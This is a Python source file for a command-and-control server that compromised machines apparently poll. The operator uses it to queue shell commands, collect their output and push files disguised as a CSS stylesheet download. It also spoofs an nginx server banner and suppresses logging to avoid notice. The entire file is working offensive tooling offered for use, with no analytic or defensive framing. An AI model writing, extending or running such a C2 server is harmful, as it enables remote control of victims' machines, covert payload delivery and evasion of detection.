from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import threading
import os
import time
import requests

# A dictionary to hold connected clients and their command queues
clients = {}
current_client = None
staged_file = None

class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Override this method to suppress the default logging
        return  # Do nothing, suppress log output

    def version_string(self):
        return "nginx/1.18.0 (Ubuntu)"

    def do_GET(self):
        global current_client
        global staged_file

        # Handle /command request (client asking for the next command)
        if self.path == '/':
            client_ip = self.client_address[0]

            # Check if the client is registered
            if client_ip in clients:
                # Check if there are commands queued for the client
                if clients[client_ip]['commands']:
                    command = clients[client_ip]['commands'].pop(0)
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'command': command}).encode())
                    print(f"Sent command to {client_ip}: {command}")
                else:
                    # No command queued, send "none"
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'command': 'none'}).encode())
            else:
                # Register the client if not already registered
                clients[client_ip] = {'commands': [], 'interactive': False}
                print(f"New client connected: {client_ip}")
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'command': 'none'}).encode())
        elif self.path == "/css/style-normal.min.css":
            if staged_file and os.path.exists(staged_file):
                self.send_response(200)
                self.send_header('Content-Disposition', f'attachment; filename="{os.path.basename(staged_file)}"')
                self.send_header('Content-type', 'application/octet-stream')
                self.end_headers()
                with open(staged_file, 'rb') as file:
                    self.wfile.write(file.read())
                print(f"Served staged file: {staged_file}")
                staged_file = None  # Clear the staged file after serving
            else:
                self.send_response(204)  # No content available

    def do_POST(self):
        global current_client
        
        # Handle /result request (client sending command output back)
        if self.path == '/':
            client_ip = self.client_address[0]
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            result = json.loads(post_data.decode())

            print(f"Received result from {client_ip}: {result['output']}")
            self.send_response(200)
            self.end_headers()
        


def run_server():
    server_address = ('', 80)
    httpd = HTTPServer(server_address, C2Handler)
    print('Server running on port 80...')
    httpd.serve_forever()

def send_command(command):
    if current_client:
        print(f"Sending command to client: {current_client}")
        clients[current_client]['commands'].append(command)
        print(f"Command queued for {current_client}: {command}")
    else:
        print("No client selected.")

def stage_file():
    """Allow the server admin to stage a file manually via console input."""
    global staged_file
    file_path = input("Enter file path to stage for client download: ").strip()
    if os.path.exists(file_path):
        staged_file = file_path
        print(f"File staged: {staged_file}")
    else:
        print(f"File not found: {file_path}")

def select_client(client_ip):
    global current_client
    if client_ip == current_client:
        current_client = None
        clients[client_ip]['interactive'] = False
        print(f"Client No Longer Selected: {client_ip}")
    elif client_ip in clients:
        current_client = client_ip
        clients[client_ip]['interactive'] = True  # Set client to interactive mode
        print(f"Switched to client: {client_ip}")
    else:
        print(f"Client {client_ip} not found.")

if __name__ == "__main__":
    # Start server in a separate thread
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()

    while True:
        os.system('clear')
        print("Menu:")
        print("1. List connected clients")
        print("2. Select a client")
        print("3. Send command to selected client")
        print("4. Upload file to selected client")
        print("5. Exit")
        
        choice = input("Enter your choice: ").strip()

        if choice == "1":
            print("Connected clients:")
            count = 0
            for client_ip in clients:
                count+=1
                status = 'In shell' if clients[client_ip]['interactive'] else 'Idle'
                print(f"{count}. {client_ip} - {status}")
                input("\nPress enter to continue...")
        elif choice == "2":
            if clients:
                print("\nChoose a client by number:")
                for idx, client_ip in enumerate(clients):
                    print(f"{idx + 1}. {client_ip}")
                client_choice = input("> ")
                try:
                    client_choice = int(client_choice) - 1
                    select_client(client_ip)
                except (IndexError, ValueError):
                    print("Invalid choice.")
                    time.sleep(2)
            else:
                print("No clients available to switch to.")
                time.sleep(2)
        elif choice == "3":
            if current_client:
                command = input("Enter command to send: ")
                send_command(command)
                print("Waiting for output\n")
                time.sleep(5)
                input("Press enter to continue")
            else:
                print("No client selected.")
                time.sleep(2)
        elif choice == "4":
            if current_client:
                stage_file()
            else:
                print("No client selected.")
            time.sleep(2)

        elif choice == "5":
            break
        else:
            print("Invalid choice. Please try again.")
            time.sleep(2)
